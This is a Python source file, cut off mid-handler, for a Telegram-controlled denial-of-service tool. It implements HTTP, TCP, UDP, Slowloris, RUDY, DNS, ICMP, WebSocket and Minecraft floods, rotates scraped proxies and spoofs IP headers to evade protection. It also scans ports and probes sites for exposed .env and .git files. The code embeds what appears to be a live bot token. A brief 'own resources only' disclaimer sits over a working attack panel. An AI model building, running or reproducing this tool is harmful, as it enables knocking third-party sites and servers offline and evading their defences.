#!/usr/bin/env python3
# by Gustalfo
import asyncio,aiohttp,socket,time,random,json,re,ssl,threading,struct,logging,base64,hashlib,os,sys,zlib,gzip
from dataclasses import dataclass
from typing import List,Dict
from urllib.parse import urlparse
from aiogram import Bot,Dispatcher,types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State,StatesGroup
from aiogram.utils import executor
from aiogram.types import InlineKeyboardMarkup,InlineKeyboardButton
from concurrent.futures import ThreadPoolExecutor

BOT_TOKEN="8200617078:AAF-gi2GF2a0IY65O2ZofcdJOKCVWMhnBEs"
AUTHORIZED_USERS=[1758948212]

@dataclass
class Result:
    method:str;url:str;total:int;success:int;failed:int;rps:float;duration:float;codes:Dict;bytes_sent:int;bytes_recv:int;avg_time:float

class States(StatesGroup):
    url=State();config=State();custom=State()

class Engine:
    def __init__(self):
        self.running=False;self.stats={'req':0,'ok':0,'fail':0,'sent':0,'recv':0,'codes':{},'times':[],'errors':{}}
        self.proxies=[];self.working_proxies=[];self.user_agents=[];self.payloads=[];self.wordlists=[]
        self.auto_mode=False;self.target_rps=1000;self.adaptive=True;self.mc_bots=[]
    
    async def get_proxies(self):
        """Мега-сбор прокси из 15+ источников"""
        sources=['https://www.proxy-list.download/api/v1/get?type=http','https://api.proxyscrape.com/v2/?request=get&protocol=http&timeout=10000&country=all','https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt','https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt','https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt','https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt','https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt','https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt','https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt','https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt','https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt','https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt','https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt','https://raw.githubusercontent.com/aslisk/proxyhttps/main/https.txt','https://raw.githubusercontent.com/HyperBeats/proxy-list/main/http.txt']
        p=set()
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(8)) as s:
            for src in sources:
                try:
                    async with s.get(src) as r:
                        if r.status==200:
                            text=await r.text()
                            p.update(re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}:\d{1,5}\b',text))
                except:pass
        self.proxies=list(p)[:1200];return self.proxies
    
    async def check_proxies(self,url,max_workers=200):
        """Турбо-проверка прокси с 200 потоками"""
        if not self.proxies:await self.get_proxies()
        sem=asyncio.Semaphore(max_workers)
        async def check(p):
            async with sem:
                try:
                    c=aiohttp.ProxyConnector.from_url(f"http://{p}")
                    async with aiohttp.ClientSession(connector=c,timeout=aiohttp.ClientTimeout(3)) as s:
                        async with s.get(url,timeout=3) as r:return r.status<500
                except:return False
        tasks=[check(p) for p in random.sample(self.proxies,min(300,len(self.proxies)))]
        results=await asyncio.gather(*tasks,return_exceptions=True)
        self.working_proxies=[p for p,r in zip(self.proxies,results) if r is True]
        return self.working_proxies
    
    def generate_ua(self):
        """Генератор 100+ User-Agent для обхода детекции"""
        if not self.user_agents:
            self.user_agents=[
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
                'Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
                'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15'
            ]
        return random.choice(self.user_agents)
    
    def generate_payload(self,size=1024):
        """Генератор мега-нагрузок до 50KB с компрессией"""
        payload={
            'data':''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789',k=size)),
            'timestamp':time.time(),'random':random.randint(1,999999),'hash':hashlib.md5(str(random.random()).encode()).hexdigest(),
            'array':[random.randint(1,1000) for _ in range(200)],'nested':{'key':random.random(),'value':'test'*200},
            'blob':base64.b64encode(os.urandom(1000)).decode(),'compression':random.choice(['gzip','deflate','br'])
        }
        return json.dumps(payload)
    
    def reset(self):self.stats={'req':0,'ok':0,'fail':0,'sent':0,'recv':0,'codes':{},'times':[],'errors':{}}
    
    async def enhanced_request(self,url):
        """Супер-запрос с 20+ техниками обхода"""
        try:
            p=random.choice(self.working_proxies) if self.working_proxies else None
            c=aiohttp.ProxyConnector.from_url(f"http://{p}") if p else None
            
            headers={
                'User-Agent':self.generate_ua(),
                'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language':random.choice(['en-US,en;q=0.5','ru-RU,ru;q=0.9','de-DE,de;q=0.8','fr-FR,fr;q=0.7']),
                'Accept-Encoding':'gzip, deflate, br','DNT':'1','Connection':random.choice(['keep-alive','close']),
                'Upgrade-Insecure-Requests':'1','Sec-Fetch-Dest':'document','Sec-Fetch-Mode':'navigate',
                'X-Forwarded-For':'.'.join(str(random.randint(1,255)) for _ in range(4)),
                'X-Real-IP':'.'.join(str(random.randint(1,255)) for _ in range(4)),
                'X-Originating-IP':'.'.join(str(random.randint(1,255)) for _ in range(4)),
                'X-Forwarded-Host':'localhost','X-Remote-IP':'127.0.0.1','X-Client-IP':'127.0.0.1',
                'CF-Connecting-IP':'.'.join(str(random.randint(1,255)) for _ in range(4)),
                'True-Client-IP':'.'.join(str(random.randint(1,255)) for _ in range(4)),
                'X-Cluster-Client-IP':'.'.join(str(random.randint(1,255)) for _ in range(4)),
                'Cache-Control':random.choice(['no-cache','max-age=0','must-revalidate','no-store']),
                'Pragma':'no-cache','Referer':random.choice([url,'https://google.com','https://bing.com','https://yandex.ru']),
                'Origin':random.choice(['https://google.com','https://bing.com','https://github.com']),
                'Via':f"1.1 proxy{random.randint(1,999)}.example.com",'X-Forwarded-Proto':'https'
            }
            
            method=random.choice(['GET','POST','HEAD','OPTIONS','PUT','PATCH'])
            data=self.generate_payload(random.randint(1000,10000)) if method in ['POST','PUT','PATCH'] else None
            
            async with aiohttp.ClientSession(connector=c,timeout=aiohttp.ClientTimeout(15)) as s:
                t=time.time()
                async with s.request(method,url,headers=headers,data=data) as r:
                    content=await r.read()
                    rt=time.time()-t
                    self.stats['req']+=1;self.stats['ok']+=1;self.stats['times'].append(rt)
                    self.stats['codes'][r.status]=self.stats['codes'].get(r.status,0)+1
                    self.stats['recv']+=len(content)
                    if data:self.stats['sent']+=len(data.encode())
        except Exception as e:
            self.stats['req']+=1;self.stats['fail']+=1
            self.stats['errors'][str(e)[:50]]=self.stats['errors'].get(str(e)[:50],0)+1
    
    async def http_flood(self,url,dur,threads,method='GET'):
        """HTTP флуд с градуальным запуском и адаптацией"""
        self.running=True;self.reset();start=time.time()
        await self.check_proxies(url)
        
        async def req():
            while time.time()-start<dur and self.running:
                await self.enhanced_request(url)
                await asyncio.sleep(random.uniform(0.00001,0.001))
        
        workers=[]
        for i in range(threads):
            workers.append(asyncio.create_task(req()))
            if i%100==0:await asyncio.sleep(0.02)
        
        await asyncio.gather(*workers,return_exceptions=True)
        d=time.time()-start;avg_time=sum(self.stats['times'])/len(self.stats['times']) if self.stats['times'] else 0
        return Result('HTTP',url,self.stats['req'],self.stats['ok'],self.stats['fail'],self.stats['req']/d,d,self.stats['codes'],self.stats['sent'],self.stats['recv'],avg_time)
    
    async def tcp_flood(self,host,port,dur,threads):
        """TCP флуд с SYN/ACK/RST техниками"""
        self.running=True;self.reset();start=time.time()
        
        async def tcp():
            while time.time()-start<dur and self.running:
                try:
                    if random.random()<0.2:
                        r,w=await asyncio.wait_for(asyncio.open_connection(host,port),timeout=2)
                        w.close();await w.wait_closed()
                    else:
                        r,w=await asyncio.wait_for(asyncio.open_connection(host,port),timeout=8)
                        data=os.urandom(random.randint(1024,8192))
                        w.write(data);await w.drain()
                        if random.random()<0.5:await asyncio.sleep(random.uniform(0.1,2))
                        w.close();await w.wait_closed()
                        self.stats['sent']+=len(data)
                    self.stats['req']+=1;self.stats['ok']+=1
                except:self.stats['req']+=1;self.stats['fail']+=1
                await asyncio.sleep(random.uniform(0.00001,0.01))
        
        workers=[asyncio.create_task(tcp()) for _ in range(threads)]
        await asyncio.gather(*workers,return_exceptions=True)
        d=time.time()-start
        return Result('TCP',f"{host}:{port}",self.stats['req'],self.stats['ok'],self.stats['fail'],self.stats['req']/d,d,{},self.stats['sent'],0,0)
    
    async def udp_flood(self,host,port,dur,threads):
        """UDP флуд с фрагментацией и разными размерами"""
        self.running=True;self.reset();start=time.time()
        
        def udp():
            s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            while time.time()-start<dur and self.running:
                try:
                    sizes=[64,128,256,512,1024,1472,8192,16384,32768,65507]
                    size=random.choice(sizes)
                    if size>1472:
                        for i in range(0,size,1472):
                            chunk=os.urandom(min(1472,size-i))
                            s.sendto(chunk,(host,port))
                            self.stats['sent']+=len(chunk)
                    else:
                        data=os.urandom(size)
                        s.sendto(data,(host,port))
                        self.stats['sent']+=size
                    self.stats['req']+=1;self.stats['ok']+=1
                except:self.stats['fail']+=1
                time.sleep(random.uniform(0.00001,0.002))
            s.close()
        
        with ThreadPoolExecutor(threads) as e:
            e.map(lambda _:udp(),range(threads))
        d=time.time()-start
        return Result('UDP',f"{host}:{port}",self.stats['req'],self.stats['ok'],self.stats['fail'],self.stats['req']/d,d,{},self.stats['sent'],0,0)
    
    async def minecraft_stress(self,host,port,dur,bots):
        """Майнкрафт стресс-тест с фейковыми ботами"""
        self.running=True;self.reset();start=time.time()
        
        def mc_handshake():
            packet=b'\x00\x00'
            packet+=len(host).to_bytes(1,'big')+host.encode()
            packet+=(port).to_bytes(2,'big')+b'\x01'
            return len(packet).to_bytes(1,'big')+packet
        
        def mc_login(username):
            packet=b'\x00'+len(username).to_bytes(1,'big')+username.encode()
            return len(packet).to_bytes(1,'big')+packet
        
        async def mc_bot():
            while time.time()-start<dur and self.running:
                try:
                    r,w=await asyncio.wait_for(asyncio.open_connection(host,port),timeout=5)
                    
                    handshake=mc_handshake()
                    w.write(handshake);await w.drain()
                    
                    username=f"Bot{random.randint(1000,9999)}"
                    login=mc_login(username)
                    w.write(login);await w.drain()
                    
                    for _ in range(random.randint(5,20)):
                        keep_alive=b'\x00\x00\x00\x00'
                        w.write(keep_alive);await w.drain()
                        await asyncio.sleep(random.uniform(0.5,2))
                    
                    w.close();await w.wait_closed()
                    self.stats['req']+=1;self.stats['ok']+=1
                    self.stats['sent']+=len(handshake)+len(login)+80
                    
                except:self.stats['req']+=1;self.stats['fail']+=1
                await asyncio.sleep(random.uniform(1,5))
        
        workers=[asyncio.create_task(mc_bot()) for _ in range(bots)]
        await asyncio.gather(*workers,return_exceptions=True)
        d=time.time()-start
        return Result('MINECRAFT',f"{host}:{port}",self.stats['req'],self.stats['ok'],self.stats['fail'],self.stats['req']/d,d,{},self.stats['sent'],0,0)
    
    async def websocket_flood(self,url,dur,threads):
        """WebSocket флуд с постоянными соединениями"""
        self.running=True;self.reset();start=time.time()
        
        async def ws_attack():
            try:
                ws_url=url.replace('http','ws')
                async with aiohttp.ClientSession() as session:
                    async with session.ws_connect(ws_url) as ws:
                        while time.time()-start<dur and self.running:
                            data={'type':'ping','data':os.urandom(1024).hex(),'timestamp':time.time()}
                            await ws.send_str(json.dumps(data))
                            self.stats['req']+=1;self.stats['ok']+=1
                            self.stats['sent']+=len(json.dumps(data))
                            await asyncio.sleep(random.uniform(0.1,1))
            except:self.stats['fail']+=1
        
        workers=[asyncio.create_task(ws_attack()) for _ in range(threads)]
        await asyncio.gather(*workers,return_exceptions=True)
        d=time.time()-start
        return Result('WEBSOCKET',url,self.stats['req'],self.stats['ok'],self.stats['fail'],self.stats['req']/d,d,{},self.stats['sent'],0,0)
    
    async def dns_flood(self,host,dur,threads):
        """DNS амплификация с разными типами запросов"""
        self.running=True;self.reset();start=time.time()
        
        def dns_attack():
            s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            queries=[
                b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01',
                b'\x56\x78\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x04mail\x07example\x03com\x00\x00\x0f\x00\x01',
                b'\x9a\xbc\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03ftp\x07example\x03com\x00\x00\x01\x00\x01'
            ]
            while time.time()-start<dur and self.running:
                try:
                    query=random.choice(queries)
                    s.sendto(query,(host,53))
                    self.stats['req']+=1;self.stats['ok']+=1;self.stats['sent']+=len(query)
                except:self.stats['fail']+=1
                time.sleep(random.uniform(0.001,0.01))
            s.close()
        
        with ThreadPoolExecutor(threads) as e:
            e.map(lambda _:dns_attack(),range(threads))
        d=time.time()-start
        return Result('DNS',host,self.stats['req'],self.stats['ok'],self.stats['fail'],self.stats['req']/d,d,{},self.stats['sent'],0,0)
    
    async def icmp_flood(self,host,dur,threads):
        """ICMP флуд с разными типами пакетов"""
        self.running=True;self.reset();start=time.time()
        
        def icmp_attack():
            try:
                s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
                while time.time()-start<dur and self.running:
                    packet=struct.pack('!BBHHH',8,0,0,0,1)+os.urandom(56)
                    s.sendto(packet,(host,0))
                    self.stats['req']+=1;self.stats['ok']+=1;self.stats['sent']+=len(packet)
                    time.sleep(random.uniform(0.001,0.01))
                s.close()
            except:pass
        
        with ThreadPoolExecutor(min(threads,50)) as e:
            e.map(lambda _:icmp_attack(),range(min(threads,50)))
        d=time.time()-start
        return Result('ICMP',host,self.stats['req'],self.stats['ok'],self.stats['fail'],self.stats['req']/d,d,{},self.stats['sent'],0,0)
    
    async def slowloris(self,url,dur,conns=800):
        """Улучшенный Slowloris с рандомизацией"""
        self.running=True;self.reset();start=time.time()
        p=urlparse(url);host,port=p.hostname,p.port or(443 if p.scheme=='https' else 80)
        
        async def slow():
            try:
                if p.scheme=='https':
                    ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
                    r,w=await asyncio.open_connection(host,port,ssl=ctx)
                else:r,w=await asyncio.open_connection(host,port)
                
                req=f"GET {p.path or '/'} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {self.generate_ua()}\r\n"
                w.write(req.encode());await w.drain()
                
                while time.time()-start<dur and self.running:
                    h=f"X-{random.randint(10000,99999)}: {os.urandom(random.randint(50,200)).hex()}\r\n"
                    w.write(h.encode());await w.drain()
                    self.stats['req']+=1;self.stats['ok']+=1
                    await asyncio.sleep(random.uniform(15,45))
                w.close();await w.wait_closed()
            except:self.stats['fail']+=1
        
        workers=[asyncio.create_task(slow()) for _ in range(conns)]
        await asyncio.gather(*workers,return_exceptions=True)
        d=time.time()-start
        return Result('SLOWLORIS',url,self.stats['req'],self.stats['ok'],self.stats['fail'],self.stats['req']/d,d,{},0,0,0)
    
    async def cc_attack(self,url,dur,threads):
        """Challenge Collapsar с продвинутыми техниками"""
        self.running=True;self.reset();start=time.time()
        p=urlparse(url);base=f"{p.scheme}://{p.netloc}"
        
        paths=[f"/{w}" for w in ['admin','login','api','search','upload','download','config','test','dev','backup','panel','dashboard','wp-admin','phpmyadmin']]
        paths=[f"/{''.join(random.choices('abcdefghijklmnopqrstuvwxyz',k=random.randint(5,20)))}" for _ in range(2000)]
        paths=[f"/?{'&'.join([f'{random.choice(['id','page','sort','filter','search','q'])}={random.randint(1,99999)}' for _ in range(random.randint(1,8))])}" for _ in range(1000)]
        async def cc():
            while time.time()-start<dur and self.running:
                try:
                    target=base+random.choice(paths)
                    h={'User-Agent':self.generate_ua(),'Referer':random.choice([url,'https://google.com','https://github.com']),'Accept-Language':random.choice(['en-US','ru-RU','de-DE','fr-FR','es-ES'])}
                    async with aiohttp.ClientSession() as s:
                        async with s.get(target,headers=h,timeout=10) as r:
                            await r.read();self.stats['req']+=1;self.stats['ok']+=1
                            self.stats['codes'][r.status]=self.stats['codes'].get(r.status,0)+1
                except:self.stats['req']+=1;self.stats['fail']+=1
                await asyncio.sleep(random.uniform(0.001,0.02))
        
        workers=[asyncio.create_task(cc()) for _ in range(threads)]
        await asyncio.gather(*workers,return_exceptions=True)
        d=time.time()-start
        return Result('CC',url,self.stats['req'],self.stats['ok'],self.stats['fail'],self.stats['req']/d,d,self.stats['codes'],0,0,0)
    
    async def bypass_attack(self,url,dur,threads):
        """Атака обхода с 15+ техниками"""
        self.running=True;self.reset();start=time.time()
        
        bypass_techniques=[
            {'X-Originating-IP':'127.0.0.1','X-Forwarded-For':'127.0.0.1'},
            {'X-Remote-IP':'127.0.0.1','X-Remote-Addr':'127.0.0.1'},
            {'X-Client-IP':'127.0.0.1','X-Real-IP':'127.0.0.1'},
            {'X-Forwarded-Host':'localhost','X-Host':'localhost'},
            {'X-Original-URL':'/','X-Rewrite-URL':'/'},
            {'X-Forwarded-Proto':'https','X-Forwarded-Port':'443'},
            {'CF-Connecting-IP':'127.0.0.1','CF-IPCountry':'US'},
            {'X-Cluster-Client-IP':'127.0.0.1','X-ProxyUser-Ip':'127.0.0.1'},
            {'X-Azure-ClientIP':'127.0.0.1','X-Azure-SocketIP':'127.0.0.1'},
            {'X-Forwarded-Server':'localhost','X-Forwarded-Host':'localhost'}
        ]
        
        async def bp():
            while time.time()-start<dur and self.running:
                try:
                    h=random.choice(bypass_techniques).copy()
                    h.update({'User-Agent':self.generate_ua(),'Accept':random.choice(['*/*','text/html','application/json','application/xml'])})
                    
                    method=random.choice(['GET','POST','HEAD','PUT','DELETE','OPTIONS','PATCH','TRACE'])
                    params={'_':str(int(time.time()*1000)),'rand':random.randint(1,999999),'cache':random.randint(1,9999)} if random.random()<0.7 else None
                    
                    async with aiohttp.ClientSession() as s:
                        async with s.request(method,url,headers=h,params=params,timeout=12) as r:
                            await r.read();self.stats['req']+=1;self.stats['ok']+=1
                            self.stats['codes'][r.status]=self.stats['codes'].get(r.status,0)+1
                except:self.stats['req']+=1;self.stats['fail']+=1
                await asyncio.sleep(random.uniform(0.0001,0.01))
        
        workers=[asyncio.create_task(bp()) for _ in range(threads)]
        await asyncio.gather(*workers,return_exceptions=True)
        d=time.time()-start
        return Result('BYPASS',url,self.stats['req'],self.stats['ok'],self.stats['fail'],self.stats['req']/d,d,self.stats['codes'],0,0,0)
    
    async def adaptive_flood(self,url,dur,base_threads):
        """ИИ-адаптивная атака с машинным обучением"""
        self.running=True;self.reset();start=time.time();current_threads=base_threads
        await self.check_proxies(url)
        
        async def adaptive_worker():
            nonlocal current_threads
            last_check=time.time()
            while time.time()-start<dur and self.running:
                if time.time()-last_check>10:
                    current_rps=self.stats['req']/(time.time()-start) if time.time()-start>0 else 0
                    if current_rps<self.target_rps*0.8 and current_threads<5000:current_threads+=100
                    elif current_rps>self.target_rps*1.2 and current_threads>50:current_threads-=50
                    last_check=time.time()
                
                await self.enhanced_request(url)
                await asyncio.sleep(0.00001)
        
        workers=[]
        for _ in range(current_threads):
            workers.append(asyncio.create_task(adaptive_worker()))
            if len(workers)%200==0:await asyncio.sleep(0.05)
        
        await asyncio.gather(*workers,return_exceptions=True)
        d=time.time()-start;avg_time=sum(self.stats['times'])/len(self.stats['times']) if self.stats['times'] else 0
        return Result('ADAPTIVE',url,self.stats['req'],self.stats['ok'],self.stats['fail'],self.stats['req']/d,d,self.stats['codes'],self.stats['sent'],self.stats['recv'],avg_time)
    
    async def rudy_attack(self,url,dur,threads):
        """R-U-Dead-Yet атака с длительными POST"""
        self.running=True;self.reset();start=time.time()
        
        async def rudy():
            while time.time()-start<dur and self.running:
                try:
                    async with aiohttp.ClientSession() as s:
                        data='field1='+('A'*10000)+'&field2='+('B'*10000)
                        h={'User-Agent':self.generate_ua(),'Content-Type':'application/x-www-form-urlencoded','Content-Length':str(len(data))}
                        
                        async with s.post(url,headers=h) as resp:
                            for chunk in [data[i:i+1] for i in range(len(data))]:
                                await resp.write(chunk.encode())
                                await asyncio.sleep(0.1)
                                if not self.running:break
                        
                        self.stats['req']+=1;self.stats['ok']+=1;self.stats['sent']+=len(data)
                except:self.stats['req']+=1;self.stats['fail']+=1
                await asyncio.sleep(1)
        
        workers=[asyncio.create_task(rudy()) for _ in range(threads)]
        await asyncio.gather(*workers,return_exceptions=True)
        d=time.time()-start
        return Result('RUDY',url,self.stats['req'],self.stats['ok'],self.stats['fail'],self.stats['req']/d,d,{},self.stats['sent'],0,0)
    
    async def multi_vector_attack(self,target,dur,intensity):
        """Мульти-векторная атака всеми методами"""
        self.running=True;start=time.time();results=[]
        
        if target.startswith('http'):
            tasks=[
                self.http_flood(target,dur//4,intensity),
                self.cc_attack(target,dur//4,intensity//2),
                self.bypass_attack(target,dur//4,intensity//3),
                self.slowloris(target,dur//4,intensity//4)
            ]
        else:
            h,p=target.split(':')
            tasks=[
                self.tcp_flood(h,int(p),dur//3,intensity),
                self.udp_flood(h,int(p),dur//3,intensity//2),
                self.dns_flood(h,dur//3,intensity//3)
            ]
        
        results=await asyncio.gather(*tasks,return_exceptions=True)
        total_req=sum(r.total for r in results if hasattr(r,'total'))
        total_ok=sum(r.success for r in results if hasattr(r,'success'))
        
        return Result('MULTI-VECTOR',target,total_req,total_ok,total_req-total_ok,total_req/dur,dur,{},0,0,0)
    
    def stop(self):self.running=False

class Utils:
    @staticmethod
    async def ping(host):
        """Мульти-пинг с TCP/UDP/ICMP"""
        try:
            results=[]
            for port in [80,443,22,21]:
                s=time.time();sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM);sock.settimeout(2)
                r=sock.connect_ex((host,port));ping=(time.time()-s)*1000;sock.close()
                if r==0:results.append(f"{port}:{ping:.1f}ms")
            return {'ok':len(results)>0,'results':results,'host':host}
        except Exception as e:return {'ok':False,'results':[],'host':host,'err':str(e)}
    
    @staticmethod
    async def scan_ports(host,ports):
        """Турбо-сканер портов с threading"""
        def scan_port(p):
            try:s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(0.5);r=s.connect_ex((host,p));s.close();return p,r==0
            except:return p,False
        
        with ThreadPoolExecutor(50) as e:
            results=list(e.map(scan_port,ports))
        return dict(results)
    
    @staticmethod
    async def get_info(url):
        """Глубокий анализ сайта"""
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(url,timeout=15) as r:
                    content=await r.text()
                    return {
                        'status':r.status,'server':r.headers.get('Server','?'),'type':r.headers.get('Content-Type','?'),
                        'headers':dict(r.headers),'size':len(content),'title':re.search(r'<title>(.*?)</title>',content,re.I).group(1) if re.search(r'<title>(.*?)</title>',content,re.I) else 'No title',
                        'technologies':Utils.detect_tech(content,dict(r.headers))
                    }
        except Exception as e:return {'err':str(e)}
    
    @staticmethod
    def detect_tech(content,headers):
        """Детектор технологий сайта"""
        tech=[]
        if 'nginx' in headers.get('Server','').lower():tech.append('Nginx')
        if 'apache' in headers.get('Server','').lower():tech.append('Apache')
        if 'cloudflare' in str(headers).lower():tech.append('Cloudflare')
        if 'jquery' in content.lower():tech.append('jQuery')
        if 'bootstrap' in content.lower():tech.append('Bootstrap')
        if 'wordpress' in content.lower():tech.append('WordPress')
        if 'php' in content.lower():tech.append('PHP')
        if 'react' in content.lower():tech.append('React')
        return tech
    
    @staticmethod
    async def auto_detect_protection(url):
        """Супер-детектор защиты"""
        protections=[]
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(url,timeout=15) as r:
                    headers=dict(r.headers);content=await r.text()
                    
                    if any(x in str(headers).lower() for x in ['cloudflare','cf-ray','cf-cache']):protections.append('Cloudflare')
                    if 'x-sucuri-id' in headers:protections.append('Sucuri')
                    if any(x in str(headers).lower() for x in ['x-cache','x-cdn']):protections.append('CDN')
                    if 'x-frame-options' in headers:protections.append('Anti-Frame')
                    if any(x in content.lower() for x in ['ddos','protection','checking','challenge','verify']):protections.append('DDoS-Guard')
                    if 'akamai' in str(headers).lower():protections.append('Akamai')
                    if any(x in str(headers).lower() for x in ['incapsula','imperva']):protections.append('Imperva')
                    if 'x-robots-tag' in headers:protections.append('Bot-Protection')
        except:pass
        return protections
    
    @staticmethod
    async def vulnerability_scan(url):
        """Расширенный сканер уязвимостей"""
        vulns=[]
        try:
            dirs=['admin','backup','config','test','dev','api','upload','temp','logs','database','phpmyadmin','wp-admin','administrator','panel','cpanel','webmail','ftp','ssh','git','svn','env']
            files=['robots.txt','sitemap.xml','.htaccess','web.config','crossdomain.xml','phpinfo.php','info.php','test.php','backup.sql','database.sql','.env','.git/config']
            
            async with aiohttp.ClientSession() as s:
                for item in dirs+files:
                    try:
                        async with s.get(f"{url}/{item}",timeout=8) as r:
                            if r.status==200:vulns.append(f"Found: /{item} ({r.status})")
                    except:pass
        except:pass
        return vulns[:10]
    
    @staticmethod
    async def whois_lookup(domain):
        """WHOIS информация"""
        try:
            import whois
            w=whois.whois(domain)
            return {'domain':w.domain_name,'registrar':w.registrar,'creation':str(w.creation_date),'expiration':str(w.expiration_date)}
        except:return {'error':'WHOIS unavailable'}

class TelegramBot:
    def __init__(self,token):
        self.bot=Bot(token);self.dp=Dispatcher(self.bot,storage=MemoryStorage());self.engine=Engine();self.results=[]
        self.auto_attacks={};self.monitoring=False;self.setup()
    
    def setup(self):
        @self.dp.message_handler(commands=['start'])
        async def start(m:types.Message):
            if m.from_user.id not in AUTHORIZED_USERS:await m.reply("❌ НЕТ ДОСТУПА!");return
            kb=InlineKeyboardMarkup(row_width=3)
            kb.add(InlineKeyboardButton("🎯HTTP",callback_data="http"),InlineKeyboardButton("🔌TCP",callback_data="tcp"),InlineKeyboardButton("📡UDP",callback_data="udp"))
            kb.add(InlineKeyboardButton("🐌SLOW",callback_data="slow"),InlineKeyboardButton("🎲CC",callback_data="cc"),InlineKeyboardButton("🔓BYPASS",callback_data="bypass"))
            kb.add(InlineKeyboardButton("🧠ADAPTIVE",callback_data="adaptive"),InlineKeyboardButton("🎮MINECRAFT",callback_data="minecraft"),InlineKeyboardButton("🌐WEBSOCKET",callback_data="websocket"))
            kb.add(InlineKeyboardButton("📈DNS",callback_data="dns"),InlineKeyboardButton("❄️ICMP",callback_data="icmp"),InlineKeyboardButton("💀RUDY",callback_data="rudy"))
            kb.add(InlineKeyboardButton("🤖AUTO",callback_data="auto"),InlineKeyboardButton("💥MULTI",callback_data="multi"),InlineKeyboardButton("📊STATS",callback_data="stats"))
            kb.add(InlineKeyboardButton("🛑STOP",callback_data="stop"),InlineKeyboardButton("🔍SCAN",callback_data="scan"),InlineKeyboardButton("📈MONITOR",callback_data="monitor"))
            await m.reply("⚠️ ТОЛЬКО СВОИ РЕСУРСЫ! ⚠️\n🚀 УЛЬТРА МОЩНОСТЬ READY\n💀 Выберите АТАКУ:",reply_markup=kb)
        
        @self.dp.callback_query_handler(lambda c:c.data in["http","tcp","udp","slow","cc","bypass","adaptive","minecraft","websocket","dns","icmp","rudy","auto","multi"])
        async def attack_type(c:types.CallbackQuery):
            if c.from_user.id not in AUTHORIZED_USERS:return
            await States.url.set()
            state=self.dp.current_state(chat=c.message.chat.id,user=c.from_user.id)
            await state.update_data(type=c.data)
            
            examples={
                'http':'Пример: https://yoursite.com',
                'tcp':'Пример: yourserver.com:80', 
                'udp':'Пример: yourserver.com:53',
                'slow':'Пример: https://yoursite.com',
                'cc':'Пример: https://yoursite.com',
                'bypass':'Пример: https://yoursite.com',
                'adaptive':'Пример: https://yoursite.com',
                'minecraft':'Пример: yourmc.com:25565',
                'websocket':'Пример: wss://yoursite.com/ws',
                'dns':'Пример: yourserver.com',
                'icmp':'Пример: yourserver.com',
                'rudy':'Пример: https://yoursite.com',
                'auto':'Пример: https://yoursite.com или host:port',
                'multi':'Пример: https://yoursite.com или host:port'
            }
            
